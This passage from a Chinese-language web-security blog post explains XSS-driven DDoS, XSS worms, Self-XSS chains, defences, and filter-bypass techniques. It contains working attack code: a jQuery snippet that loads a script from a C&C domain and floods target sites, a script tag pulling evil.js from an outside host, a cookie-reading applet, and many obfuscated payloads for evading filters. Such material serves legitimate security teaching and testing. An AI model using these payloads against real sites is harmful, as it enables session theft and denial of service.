class="line">onload&#x3D;&quot;$.getScript(&#39;http:&#x2F;&#x2F;c&amp;cdomain.com&#x2F;index.html&#39;)&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Malicious JavaScript opens hidden &lt;iframe&gt;</span><br><span class="line">function ddos(url) &#123;</span><br><span class="line">$(&quot;body&quot;).append(&quot;&lt;iframe id&#x3D;&#39;ifr11323&#39; style&#x3D;&#39;display:none;&#39;</span><br><span class="line">src&#x3D;&#39;http:&#x2F;&#x2F;c&amp;cdomain.com&#x2F;index.html&#39;&gt;&lt;&#x2F;iframe&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;  Ajax DDoS tool in executes GET request every second</span><br><span class="line">&lt;html&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Iframe&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">ddos(&#39;http:&#x2F;&#x2F;www.target1.com&#x2F;1.jpg&#39;,</span><br><span class="line">    &#39;http:&#x2F;&#x2F;www.target2.com&#x2F;1.jpg&#39;);</span><br><span class="line">function ddos(url,url2)&#123;</span><br><span class="line">            window.setInterval(function ()&#123;</span><br><span class="line">                $.getScript(url);</span><br><span class="line">                $.getScript(url2);</span><br><span class="line">                        &#125;,1000)</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>将恶意的代码注入到存在存储型XSS的网站上,如果网站的用户数量足够大,造成DOS攻击的概率也就越大</p>
<ul>
<li>DDos</li>
</ul>
<p>引用一篇Freebuf上的文章图片及部分内容</p>
<p>DDos攻击的成因是因为，攻击者可以在用户的自定义头像中插入恶意的javascript代码。所以当合法的用户访问这些存在漏洞的页面时(这些页面包含了攻击者的评论，评论中包含头像)，攻击者藏在头像中的恶意javascript代码就会被执行，这段代码向用户浏览器中插入一个隐藏的iframe，其地址指向DDos攻击者的C&amp;C服务器。</p>
<p><img src="https://image.3001.net/images/20140407/13968747583133.png!small"></p>
<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><p>在中国,比较出名的XSS蠕虫,肯定会说新浪微博事件和百度贴吧事件.历史上第一个XSS蠕虫出现在2005年10月4日的Samy蠕虫.</p>
<p>XSS蠕虫是一种借助<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Ajax/8425">Ajax</a>技术实现对Web应用程序中存在的XSS漏洞进行自动化利用传播的蠕虫病毒，它可以将一些用户数据信息发送给Web应用程序然后再将自身代码传递进入Web应用程序，等到被感染用户访问Web应用程序时，蠕虫自身将又开始进行数据发送感染。</p>
<h2 id="Self-XSS"><a href="#Self-XSS" class="headerlink" title="Self-XSS"></a>Self-XSS</h2><p>这里放一篇文章就好了……这个利用有点难,但是在一些CTF比赛中确实出现过,等遇见了再详细写一篇文章分析</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/34/">XSS Tricks - 从 SelfXSS 到登录你的账户</a></p>
<p>Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。</p>
<ul>
<li>登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录</li>
</ul>
<p>这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作：</p>
<ol>
<li>恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload</li>
<li>JavaScript Payload 生成 `` 标签，并在框架内执行以下这些操作</li>
<li>让受害者登出攻击者的账号</li>
<li>然后使得受害者通过 CSRF 登录到自己的账户个人信息界面</li>
<li>攻击者从页面提取 CSRF Token</li>
<li>然后可以使用 CSRF Token 提交修改用户的个人信息</li>
</ol>
<p>这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；<strong>X-Frame-Options</strong> 需要被设置为同源（该页面可以在相同域名页面的 <code>iframe</code> 中展示 ）</p>
<ul>
<li>登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证</li>
<li>让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面</li>
<li>让用户登录我们的账户页面出现 XSS，利用 使用 `` 标签等执行恶意代码</li>
<li>登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session</li>
</ul>
<h1 id="0x04-XSS防御"><a href="#0x04-XSS防御" class="headerlink" title="0x04 XSS防御"></a>0x04 XSS防御</h1><p>XSS攻击的两大要素就是</p>
<ul>
<li>攻击者提交恶意代码</li>
<li>浏览器客户端执行恶意代码</li>
</ul>
<p>从XSS漏洞的成因就可以知道该怎么防御了,那就是不要太相信User的输入内容, 在一些关键位置可以禁用用户输入功能,在一些必须要用户输入的地方,可以使用相关函数来进行转义<strong>等操作来避免</strong>XSS攻击,下面来详细讲一讲</p>
<p><strong>转义</strong></p>
<ul>
<li>使用escapeHTML()函数进行转义一些语法特殊符号,使恶意代码不能正常解析(比如反斜杠,使恶意代码不能闭合)</li>
<li>htmlspecialchars()函数将&lt;&gt;转换为HTML实体</li>
<li>对于链接跳转,如 &lt;a href=”xxx” 或 location.href=”xxx”,要检验其中的内容,禁止以javascript: 开头的链接</li>
<li>使用escapeEmbedJSON()函数,对内联JSON进行转义</li>
<li>使用业界成熟通用的转义库</li>
</ul>
<p><strong>防御反射型和存储型XSS攻击</strong></p>
<ul>
<li>改成纯前端渲染,将**<em>代码与数据分离**</em></li>
<li>对HTML做充分转义</li>
</ul>
<blockquote>
<p>纯前端渲染的过程,浏览器先加载一个静态的HTML,该HTML中不包含任何跟业务相关的数据,然后浏览器执行HTML中的JS代码,JS通过Ajax加载业务数据,调用DOM API更新到页面上</p>
</blockquote>
<p><strong>防御DOM型XSS攻击</strong></p>
<p>在使用.innerHTML outerHTML document.wirte()时要额外小心,不把不可信的数据作为HTML插入到页面上,而应该尽量使用.textContent .setAttribute()等</p>
<p>DOM中内联事件的监听器,如location onclick onerror onload onmouseover等 a标签的href属性 ,JS的eval(),setTimeout(),setInterval()等,都能把字符串作为代码运行</p>
<p>使用这些时,容易产生安全隐患</p>
<p>举个例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var x&#x3D;&quot;$var&quot;;</span><br><span class="line">document.write(&quot;&lt;a href&#x3D;&#39;&quot;+x+&quot;&#39; &gt;test&lt;&#x2F;a&gt;&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当”$var”输出到script时,应该执行一次javascriptEncode;在document.write输出到HTML页面时,要具体情况具体对待,如果是输出到事件或者脚本,则要再做一次javascriptEncode;如果是输出到HTML内容或者属性,则要要一次HtmlEncode;</p>
</blockquote>
<p><strong>使用Content-Security-Policy</strong>(CSP,内容安全策略)</p>
<ul>
<li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
<li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
<li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li>
<li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li>
<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
</ul>
<p><strong>对输入的内容长度进行限制</strong></p>
<p>这种措施,虽然不能完全防御XSS,但是能够增加XSS的难度</p>
<p><strong>HTTP-only Cookie</strong></p>
<p>禁止JavaScript读取某些敏感cookie,攻击者完成XSS后也无法窃取到cookie</p>
<p><strong>验证码</strong></p>
<p>防止脚本冒充用户提交危险操作,虽然有些简单的验证码方式现在也有技术能够绕过,但是也能够增加XSS的难度</p>
<p><strong>启用<em>白名单</em>或者黑名单,并且应该避免使用黑名单</strong></p>
<p><strong>几种输出的防御</strong></p>
<p>在HTML标签中/属性中输出,防御的方法是采用HtmlEncode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;$var&lt;&#x2F;div&gt;</span><br><span class="line">&lt;a href&#x3D;# &gt;$var&lt;&#x2F;a&gt;</span><br><span class="line">在属性中输出</span><br><span class="line">&lt;div id&#x3D;&quot;abc&quot; name&#x3D;&quot;$var&quot;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<p>攻击方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;abc&quot; name&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&lt;&quot;&quot;&gt;&lt;&#x2F;dvi&gt;</span><br></pre></td></tr></table></figure>

<p>在script标签中输出,在这种script标签中输出时,首先应该确保输出的变量在引号中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var x &#x3D; &quot;&quot;;alert(&quot;xss&quot;);&#x2F;&#x2F;&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者需要先闭合引号才能实施XSS攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var x &#x3D; &quot;&quot;;alert(&#x2F;xss&#x2F;);&#x2F;&#x2F;&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>防御时使用javascriptEncode</p>
<p>在事件中输出</p>
<p>在事件中输出和在script标签中输出类似</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;# onclick&#x3D;&quot;funcA(&#39;$var&#39;)&quot;&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>可能的攻击方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;# onclick&#x3D;&quot;funcA(&#39;&#39;);alert(&#x2F;xss&#x2F;);&#x2F;&#x2F;&#39;)&quot; &gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>防御时,使用javascriptEncode</p>
<h1 id="0x05-XSS检测"><a href="#0x05-XSS检测" class="headerlink" title="0x05 XSS检测"></a>0x05 XSS检测</h1><ul>
<li>使用XSS语句手动检测</li>
<li>使用扫描工具自动检测XSS漏洞</li>
</ul>
<h1 id="0x06-XSS绕过"><a href="#0x06-XSS绕过" class="headerlink" title="0x06 XSS绕过"></a>0x06 XSS绕过</h1><ul>
<li><p>大小写绕过</p>
</li>
<li><p>编码绕过</p>
</li>
<li><p>自定义标签绕过, </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;M&#x2F;onclick&#x3D;&quot;alert(1)&quot;&gt;M</span><br></pre></td></tr></table></figure>
</li>
<li><p>JSfuck绕过</p>
</li>
<li><p>使用多种能够触发执行javascript的标签来进行测试(有超过150中的方式来执行javascript代码的事件测试一个很少见的事件)</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&#x2F;onhashchange&#x3D;alert(&#39;xss&#39;)&gt;&lt;a href&#x3D;#&gt;clickit</span><br></pre></td></tr></table></figure>

<ul>
<li>猥琐流代码</li>
</ul>
<p>我上面也只是一些思路(短短几个中文汉字是没法绕过的,知识如果遇见了就往上面的绕过方法想),下面的内容也就是上面的思路的实际例子</p>
<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p><strong>/反斜杠可以用来代替空格</strong></p>
<p><strong>//为javascript的注释符</strong>,如果//被过滤,还可以使用逻辑与算术运算符来代替</p>
<p>1)先尝试插入正常的HTML标签,比如b,i,u这些来观察返回页面的情况是怎么样的,是否被HTML实体编码了,或者标签被过滤了</p>
<p>2)尝试插入不闭合的标签,比如&lt;b,&lt;i,&lt;u,&lt;marquee,&lt;script然后看一下返回情况,是不是对开放的标签页有过滤</p>
<p>3)然后测试几个payload,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(1);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;confirm(1);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;scriptsrc&#x3D;&quot;http:&#x2F;&#x2F;rhainfosec.com&#x2F;evil.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>看返回情况,是过滤了全部,还是只过滤了一部分,是否留下了alert,prompt,confirm等字符,然后再尝试大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRipt&gt;alert(&#39;xss&#39;)&lt;&#x2F;scrIPT&gt;</span><br></pre></td></tr></table></figure>

<p>4)如果仅仅是把</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;和&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>标签过滤,可以用下面这种方式来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;)&lt;&#x2F;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>

<p>5)使用&lt;a href标签进行测试,看返回的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;Baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>观察&lt;a标签是否被过滤,href是否被过滤 href里的数据是否被过滤</p>
<p>如果没有数据被过滤,可以使用javascript伪协议进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;Baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>观察返回情况,是否返回错误,还是JavaScript伪协议中的整个内容都被过滤了还是只过滤了javascript字符,如果是的话,可以尝试大小写转换,编码转换</p>
<p>继续测试事件触发执行javascript</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf&#x3D;&quot;baidu.com&quot; onmouseover&#x3D;alert(&#39;xss&#39;)&gt;Baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>看onmouseover事件是否被过滤,测试一个无效的事件,看过滤规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf&#x3D;&quot;baidu.com&quot; onclimbatree&#x3D;alert(&#39;xss&#39;)&gt;无效的事件&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>观察是完整的返回了还是和onmouseover一样被过滤了</p>
<h2 id="测试其他标签"><a href="#测试其他标签" class="headerlink" title="测试其他标签"></a>测试其他标签</h2><h3 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;xxx.xxx.xxx&quot; onerror&#x3D;alert(&#39;xss&#39;);&gt;</span><br><span class="line">&lt;img&#x2F;src&#x3D;pig.jpg onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line">&lt;video src&#x3D;a onerror&#x3D;prompt(&#39;xss&#39;);&gt;</span><br><span class="line">&lt;audio src&#x3D;x onerror&#x3D;prompt(&#39;xss&#39;);&gt;</span><br></pre></td></tr></table></figure>

<h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&#x2F;src&#x3D;&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg&#x3D;&#x3D;&quot;&gt;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="embed标签"><a href="#embed标签" class="headerlink" title="embed标签"></a>embed标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed&#x2F;src&#x3D;&#x2F;&#x2F;goo.gl&#x2F;nlXOP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="action属性"><a href="#action属性" class="headerlink" title="action属性"></a>action属性</h3><p>利用&lt;form,&lt;isindex 等标签中的action属性执行javascript</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;Javascript:alert(1)&quot;&gt;&lt;input type&#x3D;submit&gt;</span><br><span class="line">&lt;isindex action&#x3D;&quot;javascript:alert(1)&quot; type&#x3D;image&gt;</span><br><span class="line">&lt;isindex action&#x3D;j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type&#x3D;image&gt;</span><br><span class="line">&lt;isindex action&#x3D;data:text&#x2F;html, type&#x3D;image&gt;</span><br><span class="line">&lt;formaction&#x3D;&#39;data:text&amp;sol;html,&lt;script&gt;alert(1)&amp;lt&#x2F;script&amp;gt&#39;&gt;&lt;button&gt;CLICK</span><br></pre></td></tr></table></figure>

<h3 id="formaction属性"><a href="#formaction属性" class="headerlink" title="formaction属性"></a>formaction属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindexformaction&#x3D;&quot;javascript:alert(1)&quot; type&#x3D;image&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;image&quot; formaction&#x3D;JaVaScript:alert(0)&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction&#x3D;javascript&amp;colon;alert(1)&gt;CLICKME</span><br></pre></td></tr></table></figure>

<h3 id="background属性"><a href="#background属性" class="headerlink" title="background属性"></a>background属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background&#x3D;javascript:alert(1)&gt;&lt;&#x2F;table&gt; &#x2F;&#x2F; 在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure>

<h3 id="poster属性"><a href="#poster属性" class="headerlink" title="poster属性"></a>poster属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video poster&#x3D;javascript:alert(1)&#x2F;&#x2F;&gt;&lt;&#x2F;video&gt; &#x2F;&#x2F; Opera 10.5以下有效</span><br></pre></td></tr></table></figure>

<h3 id="data属性"><a href="#data属性" class="headerlink" title="data属性"></a>data属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">&lt;object&#x2F;data&#x3D;&#x2F;&#x2F;goo.gl&#x2F;nlX0P?</span><br></pre></td></tr></table></figure>

<h3 id="code属性"><a href="#code属性" class="headerlink" title="code属性"></a>code属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;applet code&#x3D;&quot;javascript:confirm(document.cookie);&quot;&gt; &#x2F;&#x2F; Firefox有效</span><br><span class="line">&lt;embed code&#x3D;&quot;http:&#x2F;&#x2F;businessinfo.co.uk&#x2F;labs&#x2F;xss&#x2F;xss.swf&quot; allowscriptaccess&#x3D;always&gt;</span><br></pre></td></tr></table></figure>

<h3 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;prompt(1);&gt;</span><br><span class="line">&lt;marquee&#x2F;onstart&#x3D;confirm(2)&gt;&#x2F;</span><br><span class="line">&lt;body onload&#x3D;prompt(1);&gt;</span><br><span class="line">&lt;select autofocus onfocus&#x3D;alert(1)&gt;</span><br><span class="line">&lt;textarea autofocus onfocus&#x3D;alert(1)&gt;</span><br><span class="line">&lt;keygen autofocus onfocus&#x3D;alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="最短的测试向量"><a href="#最短的测试向量" class="headerlink" title="最短的测试向量"></a>最短的测试向量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;q&#x2F;oncut&#x3D;open()&gt;</span><br><span class="line">&lt;q&#x2F;oncut&#x3D;alert(1)&gt;&#x2F;&#x2F;在限制长度的地方很有效</span><br></pre></td></tr></table></figure>

<h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee&lt;marquee&#x2F;onstart&#x3D;confirm(2)&gt;&#x2F;onstart&#x3D;confirm(1)&gt;</span><br><span class="line">&lt;bodylanguage&#x3D;vbsonload&#x3D;alert-1&#x2F;&#x2F;IE8有效</span><br><span class="line">&lt;command onmouseover</span><br><span class="line">&#x3D;&quot;\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x6 6\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B&quot;&gt;Save&lt;&#x2F;command&gt; &#x2F;&#x2F;IE8有效</span><br></pre></td></tr></table></figure>

<h3 id="过滤括号的情况下"><a href="#过滤括号的情况下" class="headerlink" title="过滤括号的情况下"></a>过滤括号的情况下</h3><p>当括号被过滤的时候可以使用throw来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&gt;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;javascript:window.onerror&#x3D;eval;throw&#39;&#x3D;alert\x281\x29&#39;;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="expression属性"><a href="#expression属性" class="headerlink" title="expression属性"></a>expression属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style&#x3D;&quot;xss:expression(alert(0))&quot;&gt; &#x2F;&#x2F; IE7以下</span><br><span class="line">&lt;div style&#x3D;&quot;color:rgb(&#39;&#39;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;&#x2F;div&gt; &#x2F;&#x2F; IE7以下</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(&#x2F;XSS&#x2F;))&#125;&lt;&#x2F;style&gt; &#x2F;&#x2F; IE7以下</span><br></pre></td></tr></table></figure>

<h3 id="location属性"><a href="#location属性" class="headerlink" title="location属性"></a>location属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover&#x3D;location&#x3D;&#39;javascript:alert(1)&#39;&gt;click</span><br><span class="line">&lt;body onfocus&#x3D;&quot;loaction&#x3D;&#39;javascript:alert(1)&#39;&quot;&gt;123</span><br></pre></td></tr></table></figure>

<h3 id="其他的一些payload"><a href="#其他的一些payload" class="headerlink" title="其他的一些payload"></a>其他的一些payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0;url&#x3D;&#x2F;&#x2F;goo.gl&#x2F;nlX0P&quot;&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0;javascript&amp;colon;alert(1)&quot;&#x2F;&gt;</span><br><span class="line">&lt;svg xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot;&gt;&lt;g onload&#x3D;&quot;javascript:\u0061lert(1);&quot;&gt;&lt;&#x2F;g&gt;&lt;&#x2F;svg&gt;</span><br><span class="line">&lt;svg xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot;&gt;&lt;a&gt;&lt;circle r&#x3D;100 &#x2F;&gt;&lt;animate attributeName&#x3D;&quot;xlink:href&quot; values&#x3D;&quot;;javascript:alert(1)&quot; begin&#x3D;&quot;0s&quot; dur&#x3D;&quot;0.1s&quot; fill&#x3D;&quot;freeze&quot;&#x2F;&gt;</span><br><span class="line">&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href&#x3D;&quot;]]&gt;&lt;img&#x2F;src&#x3D;xx:xonerror&#x3D;alert(2)&#x2F;&#x2F;&quot;&gt;&lt;&#x2F;svg&gt;</span><br><span class="line">&lt;meta content&#x3D;&quot;&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv&#x3D;&quot;refresh&quot;&#x2F;&gt;</span><br><span class="line">&lt;math&gt;&lt;a xlink:href&#x3D;&quot;&#x2F;&#x2F;jsfiddle.net&#x2F;t846h&#x2F;&quot;&gt;click</span><br></pre></td></tr></table></figure>

<h3 id="当-被过滤时"><a href="#当-被过滤时" class="headerlink" title="当= ( ) ; :被过滤时"></a>当= ( ) ; :被过滤时</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40&#x2F;1&#x2F;&amp;#41&lt;&#x2F;script&gt; &#x2F;&#x2F; 通杀所有浏览器</span><br></pre></td></tr></table></figure>

<h2 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h2><p>假设存在XSS漏洞的代码为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;text value&#x3D;&quot;$var&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>下面的payload均为$var的值</p>
<p>绕过方式1)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">希望达到的输出效果为</span><br><span class="line">&lt;input type&#x3D;text value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

